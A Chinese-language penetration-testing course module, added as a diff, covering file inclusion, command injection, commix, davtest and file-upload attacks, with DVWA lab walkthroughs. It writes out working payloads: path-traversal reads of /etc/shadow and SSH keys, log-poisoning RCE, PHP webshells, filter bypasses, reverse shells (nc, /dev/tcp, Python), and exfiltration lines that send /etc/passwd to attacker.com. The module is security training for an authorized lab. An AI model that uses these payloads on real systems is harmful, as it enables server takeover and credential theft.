@@ -1,0 +1,742 @@
+================================================================================
+模块 06：文件包含与命令注入
+================================================================================
+模块标题：突破边界 — 文件包含(LFI/RFI)与命令注入攻击
+学习目标：
+  1. 理解本地文件包含(LFI)和远程文件包含(RFI)的原理
+  2. 掌握LFI到RCE的攻击链 (日志注入、PHP wrapper等)
+  3. 理解命令注入的原理和危害
+  4. 熟练使用commix进行自动化命令注入利用
+  5. 掌握davtest进行WebDAV文件攻击测试
+  6. 理解文件上传漏洞的手工利用方法
+  7. 在DVWA中完成文件包含和命令注入的实战演练
+工具分类：注入攻击 / 文件攻击
+推荐工具：commix, davtest
+优先级：★★★★★ (可直接获取服务器权限的关键漏洞)
+================================================================================
+
+============================================================
+第一部分：文件包含漏洞 (LFI/RFI)
+============================================================
+
+【1.1 什么是文件包含】
+
+文件包含漏洞发生在应用程序使用用户输入来动态包含文件时，
+没有进行充分的验证和过滤。PHP中常见的危险函数:
+
+  include()       - 包含并执行文件，警告但继续
+  include_once()  - 同上，但仅包含一次
+  require()       - 包含并执行文件，错误则终止
+  require_once()  - 同上，但仅包含一次
+
+漏洞代码示例 (PHP):
+  $file = $_GET['page'];
+  include($file . ".php");
+
+正常请求: /index.php?page=home
+  → 包含 home.php
+
+恶意请求: /index.php?page=../../../../etc/passwd
+  → 包含 /etc/passwd (路径遍历)
+  → 如果.php后缀未正确处理，可能读取系统文件
+
+【1.2 LFI (本地文件包含)】
+
+LFI (Local File Inclusion): 包含服务器本地文件。
+
+危害等级：高 → 可直接读取敏感文件 → 结合其他技术可升级到RCE。
+
+典型的LFI利用:
+  1. 读取系统配置文件:
+     ?page=../../../../etc/passwd
+     ?page=../../../../etc/shadow          (需要root权限)
+     ?page=../../../../etc/hosts
+     ?page=../../../../proc/self/environ
+     ?page=../../../../var/log/apache2/access.log
+
+  2. 读取应用配置 (获取数据库凭证):
+     ?page=../../../../var/www/html/config.php
+     ?page=../../../wp-config.php
+     ?page=../../.env
+
+  3. 利用PHP Wrapper (高级技巧):
+     ?page=php://filter/convert.base64-encode/resource=index
+     → 读取index.php的base64编码内容 (绕过PHP执行)
+     
+     ?page=php://filter/read=convert.base64-encode/resource=config
+     → 读取config.php
+     
+     ?page=expect://whoami
+     → 执行系统命令 (需要安装了expect扩展)
+
+  4. 利用data:// (如果allow_url_include=On):
+     ?page=data://text/plain,<?php phpinfo();?>
+     
+     ?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
+     → 注入PHP代码执行
+
+  5. 利用input:// (如果allow_url_include=On):
+     ?page=php://input
+     POST数据: <?php system('whoami');?>
+     → 通过POST直接发送PHP代码
+
+【1.3 RFI (远程文件包含)】
+
+RFI (Remote File Inclusion): 包含远程服务器上的文件。
+
+危害等级：严重 → 可直接远程执行任意代码，相当于getshell！
+
+利用条件:
+  1. PHP配置: allow_url_include = On (PHP 5.2-)
+  2. PHP配置: allow_url_fopen = On
+  3. 目标函数使用用户输入包含文件 (无后缀或可控后缀)
+
+攻击流程:
+  Step 1: 攻击者搭建一个Web服务器
+    cd /tmp && python3 -m http.server 8080
+  
+  Step 2: 在Web服务器目录下创建恶意PHP文件
+    echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.txt
+  
+  Step 3: 利用RFI包含远程文件
+    http://target.com/page.php?page=http://attacker-ip:8080/shell.txt&cmd=whoami
+
+  Step 4: 获取执行结果
+    可以看到 whoami 的输出
+
+  Step 5: 升级到完整shell:
+    使用PHP反向Shell代码:
+    <?php
+    $sock = fsockopen("attacker-ip", 4444);
+    $proc = proc_open("/bin/sh", array(
+      0=>$sock, 1=>$sock, 2=>$sock
+    ), $pipes);
+    ?>
+
+【1.4 LFI to RCE 进阶攻击链】
+
+场景1: 日志文件注入 (Apache/Nginx)
+  Step 1: 在User-Agent中注入PHP代码
+    curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
+         http://target.com/
+
+  Step 2: 包含Apache access.log
+    ?page=../../../../var/log/apache2/access.log&cmd=whoami
+    (路径可能不同: /var/log/httpd/access_log, /var/log/nginx/access.log)
+
+场景2: /proc/self/environ注入
+  Step 1: 在User-Agent中注入PHP代码
+    curl -H "User-Agent: <?php system('id'); ?>" http://target.com/
+
+  Step 2: 包含/proc/self/environ
+    ?page=../../../../proc/self/environ
+
+场景3: Session文件注入
+  Step 1: 在可控制的输入点 (如用户名) 注入PHP代码
+    注册用户名: <?php system($_GET['cmd']); ?>
+
+  Step 2: 包含Session文件
+    ?page=../../../../tmp/sess_<PHPSESSID>&cmd=whoami
+
+场景4: 邮件日志注入
+  Step 1: 发送包含PHP代码的邮件到目标系统
+  Step 2: 包含邮件日志文件 /var/mail/www-data
+
+场景5: FTP日志注入
+  Step 1: FTP登录名使用PHP代码
+    ftp> open target.com
+    Name: <?php system($_GET['cmd']); ?>
+  Step 2: 包含FTP日志
+
+============================================================
+第二部分：命令注入 (Command Injection)
+============================================================
+
+【2.1 命令注入原理】
+
+命令注入发生在应用程序调用系统命令时，直接拼接用户输入
+而不做过滤。与代码注入(SQL注入、PHP注入)不同，命令注入
+直接与操作系统shell交互。
+
+漏洞代码示例 (PHP):
+  $ip = $_POST['ip'];
+  system("ping -c 3 " . $ip);
+
+正常输入: 127.0.0.1
+  执行: ping -c 3 127.0.0.1
+
+恶意输入: 127.0.0.1; whoami
+  执行: ping -c 3 127.0.0.1; whoami
+  结果: 先ping，然后执行whoami
+
+【2.2 命令注入连接符】
+
+Linux命令连接符：
+  ;       → 顺序执行: cmd1; cmd2         (最常用)
+  &&      → 条件执行: cmd1 && cmd2        (cmd1成功才执行cmd2)
+  ||      → 条件执行: cmd1 || cmd2        (cmd1失败才执行cmd2)
+  |       → 管道: cmd1 | cmd2             (cmd1输出作为cmd2输入)
+  ` `     → 命令替换: output=`cmd`
+  $()     → 命令替换: output=$(cmd)
+  &       → 后台执行: cmd1 & cmd2
+  \n      → 换行: cmd1%0acmd2             (URL编码)
+  %0a%0d  → CRLF
+
+Windows命令连接符：
+  &       → cmd1 & cmd2
+  &&      → cmd1 && cmd2
+  |       → cmd1 | cmd2
+  ||      → cmd1 || cmd2
+
+【2.3 命令注入绕过技巧】
+
+场景1: 空格被过滤
+  使用: ${IFS}, <>, {cmd,args}
+  例: 127.0.0.1;cat${IFS}/etc/passwd
+  例: 127.0.0.1;cat</etc/passwd
+  例: 127.0.0.1;{cat,/etc/passwd}
+
+场景2: 敏感关键词被过滤 (cat, whoami, etc.)
+  whoami → who""ami, who$()ami, who\ami
+  cat    → more, less, head, tail, nl, tac, strings
+  
+  # 多种文件读取命令:
+  cat /etc/passwd
+  more /etc/passwd
+  less /etc/passwd
+  head /etc/passwd
+  tail /etc/passwd
+  nl /etc/passwd
+  tac /etc/passwd (反序)
+  rev /etc/passwd (字符反序)
+  strings /etc/passwd
+  od -a /etc/passwd
+  base64 /etc/passwd | base64 -d
+
+场景3: 斜杠/被过滤
+  使用: ${HOME:0:1} 获取/
+  echo will 变为:
+  $(echo . | tr '!-0' '"-1')    → 产生/
+  
+场景4: 命令分隔符被过滤
+  使用: %0a (换行), %0d (回车)
+  例: 127.0.0.1%0awhoami
+
+场景5: 管道被过滤
+  使用: process substitution
+  cmd1 > /tmp/output; cmd2 < /tmp/output
+
+场景6: 完全无回显 (盲命令注入)
+  使用: 时间延迟探测
+  127.0.0.1; sleep 5   (如果延迟5秒则存在注入)
+  
+  使用: 外带数据 (Out-of-Band)
+  127.0.0.1; curl http://attacker.com/$(whoami)
+  127.0.0.1; wget http://attacker.com/$(cat /etc/passwd|base64)
+  127.0.0.1; nslookup $(whoami).attacker.com
+  127.0.0.1; ping -c 1 $(whoami).attacker.com
+
+============================================================
+第三部分：commix — 命令注入自动化工具
+============================================================
+
+【3.1 commix简介】
+
+commix (COMMand Injection eXploiter) 是自动化命令注入漏洞
+检测和利用工具。它由Python编写，能自动：
+  - 检测GET/POST/Cookie/HTTP头中的命令注入
+  - 尝试多种注入技术
+  - 建立交互式伪终端shell
+  - 文件上传/下载
+  - 支持多种操作系统 (Linux/Windows)
+
+commix是命令注入领域的sqlmap，功能强大。
+
+【3.2 基本命令】
+
+# 基本测试 (GET参数)
+commix --url="http://example.com/vuln.php?id=1"
+
+# 指定注入参数 (POST)
+commix --url="http://example.com/ping.php" \
+       --data="ip=127.0.0.1&Submit=Submit"
+
+# 指定特定参数测试
+commix --url="http://example.com/ping.php" \
+       --data="ip=127.0.0.1&Submit=Submit" -p ip
+
+# 使用Cookie
+commix --url="http://example.com/vuln.php?id=1" \
+       --cookie="PHPSESSID=abc123"
+
+# 使用代理 (配合Burp分析)
+commix --url="http://example.com/vuln.php?id=1" \
+       --proxy="http://127.0.0.1:8080"
+
+【3.3 commix输出解读】
+
+# 启动输出示例:
+  [*] Checking connection to the target URL...
+  [+] Connection to the target URL is stable.
+  [*] Setting the (non-encoded) GET parameter 'ip' for tests.
+  [*] Testing the GET parameter 'ip'.
+  [!] The GET parameter 'ip' seems injectable via ( ; ) injection.
+  [*] Do you want a Pseudo-Terminal shell? [Y/n] > Y
+  [!] Do you want to execute reverse TCP shell? [Y/n/shell] >
+
+# 选择 Y (交互式伪终端):
+  Pseudo-Terminal (type '?' for available options)
+  commix(127.0.0.1) > whoami
+  www-data
+  commix(127.0.0.1) > id
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  commix(127.0.0.1) > ls -la /var/www/html/
+  ......
+  commix(127.0.0.1) > cat /etc/passwd
+  ......
+
+【3.4 commix高级选项】
+
+# 指定操作系统
+commix --url="URL" --os=Unix
+commix --url="URL" --os=Windows
+
+# 批量模式 (所有提示选默认)
+commix --url="URL" --batch
+
+# 清空Session
+commix --url="URL" --flush-session
+
+# 指定注入技术
+commix --url="URL" --technique="t"
+# t=基于时间, c=经典, f=基于文件, e=期望
+
+# 获取操作系统Shell (反向连接)
+commix --url="URL" --os-shell
+
+# 使用反向TCP Shell
+commix --url="URL" --reverse-shell
+
+# 指定反向连接IP/端口
+commix --url="URL" --reverse-shell \
+       --rhost=192.168.1.100 --rport=4444
+
+# 上传文件
+commix --url="URL" --file-upload="/local/file" \
+       --file-dest="/remote/path/file"
+
+# 下载文件
+commix --url="URL" --file-read="/etc/passwd"
+
+# 使用编码绕过
+commix --url="URL" --encoding=hex
+commix --url="URL" --encoding=url
+
+# 忽略HTTPS证书验证
+commix --url="https://target.com" --ignore-certificate
+
+# 设置请求头
+commix --url="URL" --headers="User-Agent: Custom/1.0\nX-Forwarded-For: 127.0.0.1"
+
+# 设置User-Agent
+commix --url="URL" --user-agent="Mozilla/5.0"
+
+# 设置随机User-Agent
+commix --url="URL" --random-agent
+
+# 基于时间的注入(盲注)
+commix --url="URL" --time-sec=5
+
+# 多线程
+commix --url="URL" --threads=10
+
+【3.5 commix批量扫描】
+
+# 从文件读取多个目标
+commix --m targets.txt --batch
+
+# 从Burp日志导入
+commix -l burp.log
+
+# 从文件导入带参数的URL
+commix -m urls.txt --batch --output-dir=/home/a/commix_results/
+
+【3.6 commix 伪终端命令】
+
+进入伪终端后，支持的命令:
+  ?             → 帮助菜单
+  help          → 显示帮助
+  os_shell      → 切换OS shell
+  back          → 返回上一级
+  quit/exit     → 退出commix
+  retry         → 重试连接
+  reverse_tcp   → 发起反向TCP shell
+  bind_tcp      → 发起绑定TCP shell
+  read_file     → 读取远程文件
+  write_file    → 写入文件到远程
+  upload        → 上传文件
+  get_current_user → 获取当前用户
+  get_sys_info  → 获取系统信息
+  get_privs     → 获取权限信息
+
+============================================================
+第四部分：davtest — WebDAV测试工具
+============================================================
+
+【4.1 WebDAV简介】
+
+WebDAV (Web-based Distributed Authoring and Versioning) 是
+HTTP协议的扩展，允许客户端远程创建、移动、编辑、删除服务器
+上的文件和目录。
+
+常见WebDAV端口: 80, 443
+WebDAV方法: PROPFIND, MKCOL, MOVE, COPY, LOCK, UNLOCK
+
+如果WebDAV配置不当 (允许匿名PUT)，攻击者可以直接上传恶意文件。
+
+【4.2 davtest基本使用】
+
+# 基本测试
+davtest -url http://example.com/webdav
+
+# 指定认证
+davtest -url http://example.com/webdav \
+        -auth user:password
+
+# 扫描可以上传的文件类型
+davtest -url http://example.com/webdav
+
+输出示例:
+  [!] Checking for DAV connection...
+  [+] DAV connection successful
+  [!] Testing file extensions...
+  [+] .php   - OK (execute: yes)
+  [+] .txt   - OK (execute: no)
+  [+] .html  - OK (execute: no)
+  [+] .jsp   - OK (execute: no)
+  [!] .php file upload successful!
+  [!] Executing uploaded .php file...
+  [+] Command execution successful!
+
+【4.3 davtest高级选项】
+
+# 自定义上传目录
+davtest -url http://example.com/webdav \
+        -directory uploads/
+
+# 清理上传的文件 (测试后删除)
+davtest -url http://example.com/webdav -cleanup
+
+# 详细模式
+davtest -url http://example.com/webdav -verbose
+
+# 指定测试文件扩展名
+davtest -url http://example.com/webdav \
+        -ext php,txt,html,jsp,asp
+
+【4.4 手工WebDAV测试】
+
+# curl测试WebDAV
+# 使用OPTIONS方法查看支持的方法
+curl -X OPTIONS -v http://example.com/
+
+# 如果返回包含PROPFIND, MKCOL, PUT等，说明WebDAV开启
+
+# 使用PROPFIND列出目录
+curl -X PROPFIND http://example.com/
+
+# 使用MKCOL创建目录
+curl -X MKCOL http://example.com/newdir/
+
+# 使用PUT上传文件 (如果允许)
+curl -X PUT -d @shell.txt http://example.com/shell.txt
+
+# 使用MOVE移动文件
+curl -X MOVE --header "Destination: http://example.com/shell.php" \
+     http://example.com/shell.txt
+
+# 使用DELETE删除文件
+curl -X DELETE http://example.com/test.txt
+
+============================================================
+第五部分：文件上传漏洞
+============================================================
+
+【5.1 文件上传漏洞原理】
+
+当Web应用允许用户上传文件但不做充分验证时，攻击者可以上传
+WebShell (如PHP一句话木马)，从而获取服务器控制权。
+
+【5.2 常见绕过技巧】
+
+绕过前端验证:
+  JavaScript检查文件扩展名 → F12禁用JS或Burp拦截修改
+
+绕过扩展名黑名单:
+  .php 被禁 → 尝试: .php5, .phtml, .pht, .phar, .php.jpg
+  .php 被禁 → 尝试: .php. (Windows), .php::$DATA (Windows NTFS)
+  .php 被禁 → 尝试大小写: .Php, .PHP, .pHp
+  .php 被禁 → 尝试双扩展: shell.php.jpg, shell.jpg.php
+
+绕过Content-Type验证:
+  修改Content-Type: application/x-php → image/jpeg
+
+绕过内容验证 (Magic Bytes):
+  在PHP代码前添加GIF89a;
+  GIF89a;<?php system($_GET['cmd']); ?>
+
+绕过图片处理:
+  使用exiftool在图片中注入PHP代码:
+  exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
+  结合LFI包含该文件
+
+Apache .htaccess技巧:
+  上传.htaccess文件使.txt被当作PHP执行:
+  AddType application/x-httpd-php .txt
+  然后上传shell.txt (内容为PHP代码)
+
+【5.3 PHP一句话木马】
+
+经典一句话:
+  <?php @eval($_POST['cmd']); ?>
+  
+  使用: curl -X POST -d "cmd=system('id');" http://target.com/shell.php
+
+更隐蔽的一句话:
+  <?php 
+  $a = $_POST['x'];
+  @assert($a);
+  ?>
+  
+  使用: curl -X POST -d "x=system('id');" http://target.com/shell.php
+
+无字母一句话:
+  <?=~$_=~$_GET=~$_GET[1]?>
+
+============================================================
+第六部分：DVWA实战演练
+============================================================
+
+【实战一: DVWA文件包含攻击】
+
+预设: DVWA运行中，security = low
+
+Step 1: Firefox访问DVWA并设置安全级别
+  1. 打开Firefox, 访问: http://dvwa.local/login.php
+  2. 登录: admin / password
+  3. 左侧菜单: DVWA Security → 设置为 Low → Submit
+
+Step 2: 访问File Inclusion页面
+  左侧菜单点击: File Inclusion
+  观察URL: http://dvwa.local/vulnerabilities/fi/?page=file1.php
+  页面显示: 一个文件的内容
+
+Step 3: 尝试LFI读取系统文件
+  将URL中的page参数修改为:
+  ?page=../../../../etc/passwd
+  完整URL: http://dvwa.local/vulnerabilities/fi/?page=../../../../etc/passwd
+  观察: 显示 /etc/passwd 的内容！
+  → LFI漏洞确认！
+
+Step 4: 尝试其他敏感文件
+  ?page=../../../../etc/hosts
+  ?page=../../../../etc/apache2/apache2.conf
+  ?page=../../../../var/log/apache2/access.log
+  ?page=../../../../proc/self/environ
+
+Step 5: 尝试PHP Wrapper
+  ?page=php://filter/convert.base64-encode/resource=file1
+  观察: 返回file1.php的Base64编码内容
+  在终端解码:
+    echo "base64内容" | base64 -d
+
+Step 6: 实现LFI to RCE (日志注入)
+  6a: 先记录access.log文件
+  6b: 使用curl在User-Agent中注入PHP代码:
+  
+  curl -v -H "User-Agent: <?php system('id'); ?>" \
+       http://dvwa.local/
+  
+  6c: 包含access.log文件并查看输出:
+  ?page=../../../../var/log/apache2/access.log
+  (DVWA容器内可能需要 /var/log/apache2/其他路径)
+  
+  6d: 如果日志注入成功，看到 "uid=33(www-data)..." 的输出
+
+Step 7: 测试Medium安全级别
+  1. DVWA Security → 设置为 Medium
+  2. 回到 File Inclusion 页面
+  3. Medium会过滤 ../ 字符串
+  4. 尝试绕过: ....// → 等价于 ../
+  5. ?page=....//....//....//....//etc/passwd
+  6. 尝试: ..././ → 某些过滤无效
+  7. 尝试: /etc/passwd → 绝对路径 (某些情况下)
+
+【实战二: DVWA命令注入攻击】
+
+Step 1: 访问Command Injection页面
+  DVWA → 左侧菜单: Command Injection
+  (确保security = low)
+
+Step 2: 正常测试
+  输入: 127.0.0.1
+  点击 Submit
+  观察: ping命令的正常输出
+
+Step 3: 命令注入测试
+  输入: 127.0.0.1; whoami
+  点击 Submit
+  观察: 在ping输出之后看到 whoami 的输出
+  → 命令注入确认！
+
+Step 4: 获取更多系统信息
+  输入: 127.0.0.1; id
+  输入: 127.0.0.1; uname -a
+  输入: 127.0.0.1; cat /etc/passwd
+  输入: 127.0.0.1; ls -la /var/www/html/
+  输入: 127.0.0.1; ps aux
+
+Step 5: 反向Shell获取
+  攻击机启动监听:
+    nc -lvnp 4444
+  
+  在DVWA中注入反向Shell命令:
+  127.0.0.1; nc -e /bin/sh 192.168.1.100 4444
+  或:
+  127.0.0.1; bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
+  或:
+  127.0.0.1; python -c 'import socket,subprocess,os; \
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); \
+    s.connect(("192.168.1.100",4444)); \
+    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); \
+    os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+  
+  (将IP替换为攻击机实际IP)
+
+Step 6: 使用commix自动化利用
+  获取Cookie (Firefox → F12 → Storage):
+    PHPSESSID=abc123; security=low
+  
+  终端执行:
+  commix --url="http://dvwa.local/vulnerabilities/exec/" \
+         --data="ip=127.0.0.1&Submit=Submit" \
+         --cookie="PHPSESSID=abc123; security=low"
+
+  选择Y获取伪终端:
+  Pseudo-Terminal > whoami
+  Pseudo-Terminal > id
+  Pseudo-Terminal > ls -la /var/www/html/
+
+Step 7: 安全级别升级测试
+  1. DVWA Security → Medium → Submit
+  2. 测试: 127.0.0.1;whoami
+     → Medium会过滤 ; 和 &&
+  3. 尝试绕过:
+     127.0.0.1|whoami      → 管道 |
+     127.0.0.1&whoami      → 单&
+     127.0.0.1||whoami     → ||
+     127.0.0.1%0awhoami    → URL编码换行
+     127.0.0.1\nwhoami     → 换行
+
+Step 8: 尝试High安全级别
+  1. DVWA Security → High → Submit
+  2. High会更严格地过滤
+  3. 尝试: 127.0.0.1 |whoami (注意|旁含空格，可能绕过)
+  4. commix在High级别可能仍然有效
+
+【实战三: DVWA文件上传攻击】
+
+Step 1: 创建PHP Webshell
+  终端创建文件:
+  echo '<?php @eval($_POST["x"]); ?>' > /home/a/shell.php
+
+Step 2: 访问DVWA文件上传
+  DVWA → 左侧菜单: File Upload (security = low)
+
+Step 3: 上传Webshell
+  点击 Browse → 选择 /home/a/shell.php
+  点击 Upload
+  观察: 上传成功！显示文件路径
+
+Step 4: 验证Webshell
+  记录上传路径 (例: ../../hackable/uploads/shell.php)
+  使用curl测试:
+  curl -X POST -d "x=system('id');" \
+       http://dvwa.local/hackable/uploads/shell.php
+
+Step 5: 获取完整Shell
+  攻击机启动监听:
+  nc -lvnp 4445
+  
+  使用Webshell执行反向Shell:
+  curl -X POST \
+       -d "x=system('nc -e /bin/sh 192.168.1.100 4445');" \
+       http://dvwa.local/hackable/uploads/shell.php
+
+============================================================
+第七部分：文件包含lfi日志文件完整路径速查
+
+常见Linux路径:
+  /etc/passwd
+  /etc/shadow
+  /etc/hosts
+  /etc/hostname
+  /etc/issue
+  /etc/apache2/apache2.conf
+  /etc/nginx/nginx.conf
+  /etc/php/7.4/apache2/php.ini
+  /var/log/apache2/access.log
+  /var/log/apache2/error.log
+  /var/log/nginx/access.log
+  /var/log/nginx/error.log
+  /var/log/syslog
+  /var/log/auth.log
+  /proc/self/environ
+  /proc/self/cmdline
+  /proc/version
+  /proc/cpuinfo
+  /home/<user>/.bash_history
+  /home/<user>/.ssh/id_rsa
+
+常见Windows路径:
+  C:\Windows\System32\drivers\etc\hosts
+  C:\Windows\win.ini
+  C:\Windows\repair\SAM
+  C:\xampp\apache\conf\httpd.conf
+  C:\xampp\htdocs\config.php
+  C:\inetpub\wwwroot\web.config
+
+============================================================
+第八部分：安全注意事项
+
+⚠️  法律与安全警告：
+  1. LFI/RFI/命令注入均为高危漏洞，仅能在授权环境测试
+  2. 文件读取可能涉及用户隐私数据 (如/etc/passwd中的用户列表)
+  3. 文件写入(上传webshell)将完全控制服务器，切勿在生产环境使用
+  4. commix的--os-shell能力相当于获取服务器root权限的前奏
+  5. WebDAV攻击可能导致文件被破坏，测试后务必cleanup
+  6. 反向Shell连接可能被目标网络防火墙/IDS阻止
+
+🎯  实战技巧：
+  1. LFI + /proc/self/fd/ → 通过进程文件描述符访问被删除文件
+  2. LFI + PHP Wrapper → php://filter 绕过执行读取源码
+  3. 命令注入盲打 → 使用DNS外带 (nslookup $(whoami).attacker.com)
+  4. commix遇到困难 → 先手工确认注入点，再用commix
+  5. 文件上传 → 优先上传.htaccess配合LFI使用
+  6. 日志注入 → 优先尝试Apache，其次是Nginx，最后是SSH
+
+================================================================================
+模块小结
+================================================================================
+
+完成本模块后你应该能够：
+  ✓ 识别和利用本地文件包含 (LFI) 漏洞
+  ✓ 理解远程文件包含 (RFI) 的攻击流程
+  ✓ 通过LFI实现远程代码执行 (LFI to RCE)
+  ✓ 手工利用命令注入漏洞
+  ✓ 使用commix自动化命令注入攻击
+  ✓ 使用davtest测试WebDAV安全性
+  ✓ 手工利用文件上传漏洞获取WebShell
+  ✓ 在DVWA中完成文件包含、命令注入、文件上传的实战
+
+下一模块预告：07-认证与会话攻击 — 使用Burp Suite Intruder进行暴力破解
